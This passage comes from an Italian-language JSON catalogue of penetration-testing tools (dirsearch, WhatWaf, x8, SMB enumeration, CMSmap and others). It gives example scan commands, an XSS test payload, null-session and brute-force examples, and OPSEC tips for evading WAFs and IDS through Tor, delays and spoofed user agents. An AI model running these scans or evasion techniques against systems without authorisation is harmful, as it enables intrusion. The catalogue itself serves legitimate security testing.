      "Infrastructure",
      "Spoofing_E-mail"
    ],
    "notes": null
  },
  {
    "id": "dirsearch",
    "name": "dirsearch",
    "version": "0.4.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/maurosoria/dirsearch",
    "desc": "Fuzzer web multi-thread veloce per discovery di directory, file nascosti e backup, con wordlist intelligenti e filtri.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dirsearch</strong> è uno dei tool più utilizzati per il web content discovery, scritto in Python e attivamente mantenuto. Il suo scopo è individuare directory, file e risorse nascoste su server web tramite bruteforcing di percorsi URL. A differenza di scanner più generici, Dirsearch è ottimizzato specificamente per questa attività, con wordlist integrate di alta qualità che coprono pattern comuni come pannelli di amministrazione, file di backup, repository Git esposti e configurazioni sensibili. La sua architettura multi-thread e il supporto per connessioni HTTP/1.1 keep-alive lo rendono estremamente veloce anche su target con latenza elevata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Threading & Performance:</strong> Dirsearch gestisce decine di thread paralleli con connessioni persistenti per massimizzare il throughput. Supporta HTTP e HTTPS con verifica certificati opzionale, proxy SOCKS/HTTP e timeout configurabili. La modalità ricorsiva permette di esplorare automaticamente le sottodirectory scoperte, ampliando la superficie di ricerca senza intervento manuale.</p><p><strong>Smart Response Filtering:</strong> Uno dei problemi principali nel path bruteforcing sono i falsi positivi causati da pagine 404 personalizzate che restituiscono status 200. Dirsearch implementa un sistema di calibrazione automatica che rileva questi pattern e filtra le risposte in base a dimensione, status code, numero di parole o espressioni regolari. Questo riduce drasticamente il rumore nell'output.</p><p><strong>Wordlist & Extension Management:</strong> Include wordlist ottimizzate per diversi scenari (web generico, CMS specifici, API). Supporta la sostituzione dinamica delle estensioni tramite il placeholder <code>%EXT%</code>, permettendo di testare ogni percorso con multiple estensioni (.php, .asp, .bak, .old) in un singolo passaggio. È possibile anche forzare estensioni aggiuntive su ogni entry della wordlist.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Dirsearch è installato di default su Kali Linux. Può essere eseguito direttamente come comando o tramite Python. Richiede Python 3.7+ e le dipendenze vengono installate automaticamente.</p><pre><code># Scansione base con estensioni comuni\ndirsearch -u https://target.com -e php,html,txt,bak\n\n# Scansione ricorsiva con wordlist custom e output JSON\ndirsearch -u https://target.com -w /usr/share/wordlists/dirb/big.txt -e php --recursive -o results.json --format json\n\n# Scansione stealth con delay, proxy e filtro status code\ndirsearch -u https://target.com -e php,asp --delay 0.5 --proxy socks5://127.0.0.1:9050 --exclude-status 403,500\n\n# Scansione multipla da lista URL\ndirsearch -l urls.txt -e php,html --threads 30</code></pre><p>L'output può essere salvato in formati multipli (plain text, JSON, CSV, XML) per integrazione con altri tool. È consigliabile iniziare con la wordlist di default e poi passare a liste più aggressive solo se necessario.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Web Application Assessment</strong>, dirsearch è il primo tool da lanciare dopo aver identificato i target web. Permette di scoprire risorse non linkate come pannelli di login (<code>/admin/</code>), file di configurazione esposti (<code>wp-config.php.bak</code>), directory di backup (<code>/backup/</code>) o repository di codice sorgente (<code>/.git/HEAD</code>) che offrono percorsi diretti alla compromissione.</p><p>Durante il <strong>Bug Bounty Hunting</strong>, è essenziale per trovare endpoint nascosti o dimenticati dagli sviluppatori, come API di debug, file di log accessibili o pagine di test non rimosse in produzione.</p><p>Per la <strong>Compliance Verification</strong>, i team di sicurezza lo utilizzano per verificare che i deployment non espongano risorse sensibili come file <code>.env</code>, directory <code>/phpmyadmin/</code> o pagine di status dei servizi interni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Dirsearch genera un volume molto elevato di richieste HTTP, la maggior parte delle quali produce errori 404. Questo pattern è facilmente identificabile da WAF (ModSecurity, Cloudflare), sistemi IDS/IPS e meccanismi di rate-limiting come Fail2Ban. I log del web server mostreranno migliaia di entry sequenziali con percorsi inesistenti.</p><p><strong>Impatto operativo:</strong> Su server con risorse limitate o applicazioni mal configurate, il volume di richieste può causare rallentamenti o saturazione dei log. Alcuni WAF bloccheranno l'IP sorgente dopo poche centinaia di richieste 404 consecutive.</p><p><strong>Mitigazioni:</strong> Utilizzare <code>--delay</code> per rallentare le richieste e ridurre la detectabilità. Ruotare l'IP sorgente tramite proxy chain o Tor. Personalizzare lo User-Agent con <code>--random-agent</code> per evitare il fingerprinting del tool. In ambienti con WAF aggressivi, preferire wordlist più piccole e mirate piuttosto che liste massive.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "aquatone-linux-amd64",
    "name": "aquatone_linux_amd64",
    "version": "1.7.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/michenriksen/aquatone",
    "desc": "Tool di ricognizione visiva che esegue screenshot automatici di domini multipli e clusterizza i risultati per rapida revisione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Aquatone è uno strumento essenziale per la ricognizione web su larga scala. Quando si ha a che fare con centinaia di sottodomini, visitarli manualmente è impossibile. Aquatone utilizza browser headless (Chromium/Puppeteer) per visitare automaticamente ogni target, catturare uno screenshot, e raccogliere gli header di risposta. La sua potenza sta nel generare un report HTML visuale che raggruppa le pagine simili, permettendo all'analista di individuare a colpo d'occhio superfici d'attacco interessanti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Visual Clustering:</strong> Analizza la struttura HTML e gli screenshot per raggruppare pagine identiche (es. pagine di default di IIS o Apache). Questo riduce il rumore, permettendo di ignorare centinaia di siti inutili e concentrarsi sulle deviazioni.</p><p><strong>Port Scanning Integration:</strong> Può importare direttamente output di Nmap o Masscan, o eseguire una scansione rapida delle porte web comuni (80, 443, 8000, 8080) prima di tentare lo screenshot.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Accetta input via pipe standard (es. lista di domini o URL).</p><pre><code># Pipeline tipica: Discovery -> Aquatone\ncat subdomains.txt | ./aquatone_linux_amd64 -ports large -out ./report</code></pre><p>Al termine, aprire il file <code>aquatone_report.html</code> nel browser per navigare i risultati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In un <strong>External Infrastructure Assessment</strong>, Aquatone trasforma una lista di 5000 IP in una galleria navigabile, evidenziando immediatamente pannelli di login esposti, directory listing aperti o errori applicativi che espongono versioni software.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera traffico HTTP standard, ma con pattern riconoscibili se non si personalizza lo User-Agent. Navigare migliaia di URL in breve tempo può far scattare blocchi IP.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "Visual_Recon"
    ],
    "notes": null
  },
  {
    "id": "whatwaf-1-9",
    "name": "WhatWaf",
    "version": "1.9",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Ekultek/WhatWaf",
    "desc": "Tool di detection avanzata per Web Application Firewall (WAF) che suggerisce tecniche di bypass e tamper payload.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WhatWaf e uno strumento avanzato di detection e analisi dei Web Application Firewall che va oltre la semplice identificazione del vendor. Invia payload malevoli calibrati (XSS, SQLi, path traversal) al target e analizza le risposte HTTP per determinare quale WAF e in uso, basandosi su firme negli header, codici di stato e contenuto delle pagine di blocco. La caratteristica distintiva e la capacita di suggerire e testare automaticamente script di tampering specifici per il WAF identificato, indicando quali tecniche di bypass funzionano.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>WAF Fingerprinting avanzato:</strong> Riconosce oltre 70 WAF tra cui Cloudflare, AWS WAF, Imperva, Akamai Kona, F5 BIG-IP, ModSecurity e Sucuri. L'identificazione avviene tramite analisi multifattoriale: header specifici (X-Sucuri-ID, CF-RAY), pattern nelle pagine di errore, comportamento di redirect e timing delle risposte.</p><p><strong>Bypass Testing automatizzato:</strong> Una volta identificato il WAF, tenta payload modificati con double URL encoding, Unicode normalization, case variation, comment insertion e NULL byte injection. Per ogni tecnica, verifica se il payload passa il WAF e raggiunge l'applicazione.</p><p><strong>Integrazione SQLMap:</strong> I bypass trovati possono essere esportati in formato compatibile con i tamper script di SQLMap, configurando automaticamente lo scanner per operare attraverso il WAF.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python con interfaccia CLI intuitiva.</p><pre><code># Analisi WAF su target singolo\nwhatwaf -u https://target.com\n\n# Bypass attivo con payload XSS\nwhatwaf -u https://target.com --pl \"&lt;script&gt;alert(1)&lt;/script&gt;\" --ra\n\n# Scansione batch da lista URL\nwhatwaf -l targets.txt --csv output.csv\n\n# Analisi con proxy Burp\nwhatwaf -u https://target.com --proxy http://127.0.0.1:8080\n\n# Test di tutti i tamper\nwhatwaf -u https://target.com --tamper-all</code></pre><p>Usare --ra (random agent) per evitare blocchi basati su User-Agent.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Preparazione pre-assessment web:</strong> Prima di lanciare SQLMap, Burp Active Scanner o Nuclei, identificare il WAF permette di configurare tamper script, delay e tecniche di evasione adeguate. Senza questa fase, gli scanner vengono bloccati generando falsi negativi.</p><p><strong>Validazione difese WAF:</strong> In ottica blue team, WhatWaf verifica che il WAF sia correttamente configurato e che non esistano bypass banali con tecniche standard.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Invia payload di attacco evidenti che vengono loggati e bloccati. Il WAF registrera IP sorgente e payload. In ambienti con SOC attivo, genera alert immediati.</p><p><strong>Impatto operativo:</strong> I tentativi di bypass possono causare ban temporaneo o permanente dell'IP. Alcuni WAF implementano escalation progressiva con blacklist per periodi crescenti.</p><p><strong>Mitigazioni:</strong> Usare proxy/VPN dedicata separata dalle altre fasi. Iniziare con analisi passiva degli header prima dei payload attivi. Distribuire i test nel tempo per evitare ban automatico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "WAF"
    ],
    "notes": null
  },
  {
    "id": "paramspider",
    "name": "paramspider",
    "version": "1.0.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/devanshbatham/ParamSpider",
    "desc": "Tool di ricognizione passiva che estrae parametri URL da archivi web (Wayback Machine) per scoprire vulnerabilità nascoste.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ParamSpider</strong> è uno strumento di ricognizione focalizzato sulla scoperta di parametri URL potenzialmente vulnerabili senza interagire direttamente con il target (passive recon). Interroga enormi archivi storici come la Wayback Machine e Common Crawl per recuperare vecchi URL associati al dominio bersaglio. Questo permette di identificare parametri \"dimenticati\" (es. <code>?debug=true</code>, <code>?admin_token=</code>) che sono vettori ideali per XSS, SQL Injection o SSRF, spesso sfuggiti ai crawler attivi moderni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Mining da Archivi Web:</strong> Non esegue crawling attivo, ma estrae milioni di URL storici dagli archivi pubblici. Questo approccio è invisibile ai sistemi di difesa del target (WAF/SIEM) e rivela endpoint dismessi ma ancora attivi.</p><p><strong>Parameter Cleaning:</strong> Include algoritmi per pulire i risultati, rimuovendo duplicati e URL \"spazzatura\" (es. immagini .jpg, .css) per fornire una lista pulita di parametri testabili (fuzzing ready).</p><p><strong>Supporto Nested Parameters:</strong> Capace di identificare strutture complesse di URL e parametri annidati, spesso usati in applicazioni enterprise legacy.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python 3. L'output viene salvato automaticamente in un file txt.</p><pre><code># Scansione base di un dominio\npython3 paramspider.py -d target.com\n\n# Scansione con esclusione di estensioni e output custom\npython3 paramspider.py -d target.com --exclude php,aspx --output params.txt --level high</code></pre><p>I risultati sono formattati per essere passati direttamente a tool di fuzzing come GF (Grep Fuzz) o Nuclei.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Fondamentale nel <strong>Bug Bounty Hunting</strong> su target molto grandi o \"hardenizzati\". Quando la homepage è sicura, ParamSpider trova quella vecchia pagina di marketing del 2018 con un parametro <code>?redirect=</code> vulnerabile a Open Redirect o XSS. In <strong>Web Application Assessment</strong>, aiuta a mappare la superficie d'attacco storica che non è linkata nell'applicazione attuale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Zero traffico verso il target durante la fase di discovery (totalmente passiva). Il traffico viene generato solo quando si testano i parametri trovati.</p><p><strong>Mitigazioni:</strong> Nessuna necessaria per la fase di discovery. Attenzione quando si inizia il probing attivo degli URL trovati (molti potrebbero essere 404).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Params_Discovery"
    ],
    "notes": null
  },
  {
    "id": "x8",
    "name": "x8",
    "version": "4.3.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Sh1Yo/x8",
    "desc": "Tool Rust ad alte prestazioni per la discovery di parametri HTTP nascosti (query, body, header) tramite analisi differenziale delle risposte.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>x8</strong> è un tool di parameter discovery scritto in Rust (2.000+ stelle GitHub), progettato per identificare parametri nascosti in applicazioni web che potrebbero rivelare funzionalità non documentate o superfici di attacco aggiuntive. A differenza di tool come Arjun che operano prevalentemente su query string, x8 supporta nativamente la discovery su <strong>query parameters</strong>, <strong>body parameters</strong> (POST/PUT), <strong>HTTP headers</strong> e <strong>injection point custom</strong> tramite un sistema di template. Il motore di detection combina confronto riga-per-riga delle pagine, analisi dei codici di risposta HTTP e rilevamento di reflection dei parametri, minimizzando i falsi positivi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Detection multi-metodo:</strong> x8 non si limita a confrontare la lunghezza della risposta. Analizza le differenze riga-per-riga tra risposte baseline e risposte con parametri iniettati, rileva cambiamenti nei codici HTTP e verifica se il valore del parametro viene riflesso nella pagina. La modalità strict (<code>--strict</code>) riporta solo parametri che modificano la struttura della pagina.</p><p><strong>Parametri non-random:</strong> Oltre al fuzzing con valori casuali, testa automaticamente parametri con valori fissi significativi come <code>admin=true</code>, <code>debug=1</code>, <code>test=1</code>, <code>captcha=off</code>, che possono sbloccare funzionalità nascoste o bypassare controlli di sicurezza.</p><p><strong>Sistema di template:</strong> I placeholder <code>%k</code> (chiave) e <code>%v</code> (valore) permettono di definire punti di injection personalizzati ovunque nella richiesta HTTP, supportando scenari non standard come parametri in path, cookie o header custom.</p><p><strong>Scalabilità:</strong> Progettato per processare migliaia di URL per esecuzione con concorrenza configurabile per URL, delay tra richieste, supporto proxy e selezione della versione HTTP (1.1/2.0). La verifica automatica dei parametri trovati riduce i falsi positivi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Disponibile come binario precompilato (Linux, Windows), via cargo, nei repository BlackArch o come container Docker.</p><pre><code># Discovery parametri query string\nx8 -u \"http://target.com/page\" -w params.txt\n\n# Discovery parametri POST body\nx8 -u \"http://target.com/api\" -X POST -w params.txt\n\n# Discovery header nascosti\nx8 -u \"http://target.com\" -w headers.txt --headers\n\n# Template custom con injection point specifico\nx8 -u \"http://target.com/page\" --param-template \"%k=%v&fixed=1\"\n\n# Scansione bulk da file con output JSON\nx8 -u urls.txt -w params.txt -o json\n\n# Modalità strict con concorrenza e delay\nx8 -u \"http://target.com/page\" -w params.txt --strict -c 5 --delay 100\n\n# Discovery ricorsiva con verifica\nx8 -u \"http://target.com/page\" -w params.txt --verify --recursion-depth 2</code></pre><p>Le wordlist consigliate provengono dai repository <strong>samlists</strong> (dello stesso autore), <strong>Arjun</strong> e <strong>Param Miner</strong> per gli header.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Web Reconnaissance</strong>, x8 rivela parametri non documentati che possono esporre funzionalità di debug, pannelli admin nascosti, bypass di autenticazione o injection point per vulnerabilità come SSRF, IDOR e privilege escalation.</p><p>Per <strong>Bug Bounty</strong>, la discovery di parametri nascosti è spesso il primo passo per trovare vulnerabilità che gli scanner automatici non rilevano, come parametri <code>debug</code>, <code>admin</code> o <code>redirect</code> non linkati nell'interfaccia.</p><p>In combinazione con <strong>ParamSpider</strong> (discovery passiva da archivi) e <strong>Arjun</strong> (discovery attiva base), x8 aggiunge la capacità di testare header e body con detection avanzata, coprendo l'intera superficie di parameter discovery.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il tool genera un volume significativo di richieste HTTP con parametri variabili, pattern facilmente identificabile da WAF. Le richieste con parametri come <code>admin=true</code> o <code>debug=1</code> possono triggerare regole di sicurezza specifiche.</p><p><strong>Impatto operativo:</strong> L'alto numero di richieste può causare rate-limiting o ban IP. In modalità aggressiva, può generare carico significativo sul server target.</p><p><strong>Mitigazioni:</strong> Utilizzare <code>--delay</code> per introdurre pausa tra le richieste. Configurare <code>-c</code> (concorrenza) a valori bassi. Usare proxy per distribuire il traffico. La modalità <code>--verify</code> riduce il numero di richieste ripetendo solo i finding sospetti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Params_Discovery"
    ],
    "notes": null
  },
  {
    "id": "smb-enum",
    "name": "SMB-enum",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Metodologia e raccolta tool (smbclient, rpcclient, nmap) per enumerazione profonda del servizio SMB: share, utenti, gruppi e permessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SMB-enum</strong> non è un singolo software ma rappresenta l'insieme delle tecniche e tool standard utilizzati per interrogare il servizio SMB/RPC (porta 445/139). Questa fase è critica nei test interni perché SMB spesso espone informazioni preziose (user enumeration via RID cycling, null sessions) o accessi diretti (share scrivibili) che permettono di ottenere un foothold senza exploit complessi.</p><br><hr><h4 class=\"rt-purple\">Tecniche e Tool</h4><p><strong>Null Session & Guest Access:</strong> Verifica se è possibile connettersi senza credenziali (<code>rpcclient -U \"\"</code> o <code>smbclient -N</code>). Se abilitato, permette di enumerare utenti e password policy.</p><p><strong>RID Cycling:</strong> Tecnica che interroga ciclicamente gli ID relativi (RID) degli account per mappare username e gruppi, efficace anche se la lista utenti è protetta.</p><p><strong>Share Enumeration:</strong> Scansione dei permessi su cartelle condivise (SYSVOL, NETLOGON, profili) per trovare file sensibili o punti di scrittura.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si basa su utility Linux standard o script Nmap.</p><pre><code># Listare share con smbclient (Null session)\nsmbclient -L //192.168.1.10 -N\n\n# Enumerazione utenti via rpcclient\nrpcclient -U \"\" 192.168.1.10 -c \"enumdomusers\"\n\n# Nmap script automation\nnmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery target_ip\n\n# Tool automatizzato alternativo: enum4linux-ng\nenum4linux-ng -A 192.168.1.10</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>È il primo passo in un <strong>Internal Pentest</strong> dopo il discovery degli host. Spesso rivela account \"Guest\" attivi o share configurate male (\"Everyone: Full Control\") che offrono accesso immediato. L'enumerazione della Password Policy via SMB è fondamentale per calibrare i successivi attacchi di password spraying senza bloccare account.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Tentativi di Null Session e scansioni Nmap sono loggati e rilevati da IDS. Il RID Cycling genera molti errori se non mirato.</p><p><strong>Mitigazioni:</strong> Usare traffico mirato. Se si possiedono credenziali valide, usarle sempre invece di tentare accessi anonimi che sono più sospetti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "postman",
    "name": "Postman",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://www.postman.com/downloads/",
    "desc": "Piattaforma di collaborazione per API development, usata in security per testare, fuzzare e manipolare endpoint REST/GraphQL/SOAP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Postman, nato come piattaforma per sviluppatori API, e diventato indispensabile per l'API Security Testing. L'interfaccia grafica permette di costruire e eseguire richieste HTTP complesse verso API REST, GraphQL, SOAP e gRPC con controllo granulare su metodi, header, body e autenticazione. Per il penetration tester, e l'interfaccia ideale per interagire con endpoint che non hanno frontend web, testando vulnerabilita come IDOR, Mass Assignment, Broken Authentication e BOLA.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Collection Runner e automazione:</strong> Organizza richieste in collezioni ed esegue sequenze automatiche. Fondamentale per riprodurre catene di exploit multi-step o fuzzing leggero iterando variabili su dataset CSV. Pre-request e test script in JavaScript automatizzano la logica di testing complessa.</p><p><strong>Gestione autenticazione dinamica:</strong> Supporta OAuth 2.0, JWT, Bearer Token, API Key, Basic Auth, Digest e NTLM. Le variabili di ambiente gestiscono token dinamici, estraendoli dalle risposte e iniettandoli nelle richieste successive. Cruciale per API con token a scadenza frequente.</p><p><strong>Proxy Capture e importazione:</strong> Funziona come proxy HTTP per catturare traffico da browser o app mobile, costruendo automaticamente la collezione API. Importa specifiche OpenAPI/Swagger, WSDL e GraphQL schema per mappare rapidamente tutti gli endpoint.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Applicazione desktop GUI. Supporta CLI con Newman per pipeline CI/CD.</p><pre><code># Workflow tipico API Security Testing\n1. Importare specifica OpenAPI (target-api.yaml)\n2. Configurare Environment con base URL e Bearer Token\n3. Testare BOLA: modificare ID in GET /api/v1/users/{id}\n4. Testare Mass Assignment: aggiungere \"role\":\"admin\" in PUT\n5. Testare Rate Limiting: Collection Runner 1000 iterazioni\n\n# Esecuzione automatizzata CLI\nnewman run collection.json -e environment.json --reporters cli,json</code></pre><p>Usare la console per ispezionare header e body completi, inclusi quelli nascosti dall'interfaccia.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>API Penetration Testing:</strong> Per backend REST o GraphQL, Postman offre controllo granulare su verbi HTTP (PUT, DELETE, PATCH), header e body JSON/XML che il browser non permette di manipolare. Essenziale per vulnerabilita di business logic.</p><p><strong>Testing applicazioni mobile:</strong> Le app mobile comunicano via API. Catturando il traffico con il proxy, si ricostruisce la superficie di attacco e si testa ogni endpoint modificando parametri che il client non permetterebbe di alterare.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste includono header identificativi (Postman-Token) e User-Agent specifico. Rimuovere sempre questi header prima del testing.</p><p><strong>Impatto operativo:</strong> Non e uno scanner automatico. Richiede input manuale e comprensione della logica applicativa. Il Collection Runner con molte iterazioni genera carico significativo.</p><p><strong>Mitigazioni:</strong> Configurare header custom che simulino un browser reale. Usare variabili di ambiente per separare test da produzione. Non sincronizzare collezioni nel cloud se contengono dati sensibili del target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "API"
    ],
    "notes": null
  },
  {
    "id": "cmseek-v-1-1-3",
    "name": "CMSeeK",
    "version": "1.1.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Tuhinshubhra/CMSeeK",
    "desc": "Scanner avanzato per rilevamento e analisi di oltre 180 CMS, con detection versione, plugin e vulnerabilità note.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CMSeeK e uno degli strumenti di fingerprinting piu completi per Content Management System. A differenza di tool specializzati come WPScan o JoomScan, supporta oltre 180 piattaforme CMS tra cui WordPress, Joomla, Drupal, Magento, Shopify, Wix, Ghost e PrestaShop. Esegue una Deep Scan multilivello combinando analisi del codice sorgente HTML, ispezione file statici, esame header HTTP e verifica metadati per identificare il CMS e la versione esatta, poi correla con database di vulnerabilita per suggerire exploit applicabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Deep Scan e Version Detection:</strong> Analizza codice sorgente, file come readme.txt, license.txt, CHANGELOG e meta tag generator per determinare la versione precisa del CMS. Fondamentale per mappare le CVE applicabili, dove spesso la differenza tra versione vulnerabile e patchata e minima (es. WordPress 6.1.0 vs 6.1.1).</p><p><strong>Moduli CMS-specifici:</strong> Per WordPress: enumerazione utenti, plugin e temi, rilevamento file sensibili (wp-config.php.bak, debug.log). Per Joomla: ricerca backup di configurazione e enumerazione componenti. Ogni modulo sfrutta le peculiarita del CMS target.</p><p><strong>Correlazione vulnerabilita:</strong> Dopo l'identificazione, interroga database di vulnerabilita per presentare CVE note e link a exploit pubblici, riducendo il tempo tra ricognizione e exploitation.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Interfaccia CLI con modalita interattiva o diretta.</p><pre><code># Scansione standard URL\npython3 cmseek.py -u https://target.com\n\n# Scansione batch da lista\npython3 cmseek.py -l sites.txt --batch\n\n# Scansione con follow redirect e verbose\npython3 cmseek.py -u https://target.com -v --follow-redirect\n\n# User-Agent personalizzato\npython3 cmseek.py -u https://target.com --user-agent \"Mozilla/5.0\"</code></pre><p>I risultati vengono salvati in directory strutturata per target con report JSON per integrazione in pipeline.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Fase iniziale Web Assessment:</strong> Di fronte a un sito sconosciuto, CMSeeK identifica rapidamente la tecnologia sottostante, permettendo di scegliere tool di exploit specifici: WPScan per WordPress, Droopescan per Drupal, approccio manuale per CMS rari.</p><p><strong>Scansione su larga scala:</strong> In assessment con decine di siti, la modalita batch classifica automaticamente ogni sito per tecnologia CMS, prioritizzando versioni obsolete per analisi approfondita.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Scansioni attive con traffico HTTP riconoscibile. Richieste verso file caratteristici (readme.txt, wp-login.php) sono pattern noti ai WAF. Lo User-Agent di default e facilmente identificabile.</p><p><strong>Impatto operativo:</strong> Richieste simultanee possono generare carico anomalo su server poco performanti. La modalita batch su liste grandi puo sovraccaricare la connessione locale.</p><p><strong>Mitigazioni:</strong> Usare User-Agent personalizzato. Aggiungere delay tra richieste. Con WAF, considerare proxy rotanti. Verificare sempre che il target sia in scope prima della scansione batch.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "CMS",
      "General"
    ],
    "notes": null
  },
  {
    "id": "cmsmap",
    "name": "CMSmap",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dionach/CMSmap",
    "desc": "Scanner di vulnerabilità Python per CMS (WordPress, Joomla, Drupal, Moodle) con rilevamento plugin, temi e brute-force.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>CMSmap</strong> è uno strumento centralizzato per l'audit di sicurezza dei Content Management System più diffusi. Automatizza il processo di fingerprinting per identificare versioni, plugin e temi installati, correlandoli con database di exploit pubblici (Exploit-DB) per segnalare vulnerabilità note. Integra anche moduli per attacchi di forza bruta e post-exploitation basilare.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-CMS Support:</strong> Rileva e scansiona automaticamente WordPress, Joomla, Drupal e Moodle, adattando le tecniche di enumerazione alla piattaforma target senza bisogno di configurazione manuale.</p><p><strong>Vulnerability Mapping:</strong> Scarica e mantiene aggiornato un database locale di exploit. Quando rileva un plugin o una versione specifica, controlla se esistono PoC (Proof of Concept) disponibili, fornendo link diretti alle vulnerabilità.</p><p><strong>Deep Enumeration:</strong> Esegue l'enumerazione degli utenti, scan dei file di backup, e directory listing. Include un modulo per il cracking delle password via dizionario contro i pannelli di login amministrativi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'esecuzione standard richiede solo l'URL del target. Il tool riconosce automaticamente il tipo di CMS.</p><pre><code># Scansione completa automatica\ncmsmap.py https://target-blog.com\n\n# Scansione WordPress con utente specifico per brute-force\ncmsmap.py https://wp-site.com -u admin -p passwords.txt\n\n# Aggiornamento database exploit\ncmsmap.py -U PC</code></pre><p>Per evitare falsi positivi o scansioni troppo lente, è possibile disabilitare il check degli exploit con <code>--noedb</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Ideale nella fase di <strong>Web Application Assessment</strong> quando si incontrano installazioni standard di CMS. Permette di identificare rapidamente \"low hanging fruits\" come plugin non aggiornati da anni o configurazioni di default, prima di passare a test manuali più approfonditi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le scansioni complete (Full Scan) generano migliaia di richieste HTTP in breve tempo, facilmente bloccabili da WAF e plugin di sicurezza (es. Wordfence). Il brute-force triggera immediatamente alert di login falliti.</p><p><strong>Mitigazioni:</strong> Usare user-agent custom. Evitare il brute-force se non strettamente necessario. Preferire scansioni passive o mirate se il WAF è attivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "CMS",
      "General"
    ],
    "notes": null
  },
  {
    "id": "joomlascan",
    "name": "JoomlaScan",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/drego85/JoomlaScan",
    "desc": "Scanner di vulnerabilità per Joomla: rileva versione, componenti installati, firewall e misconfigurazioni note.",
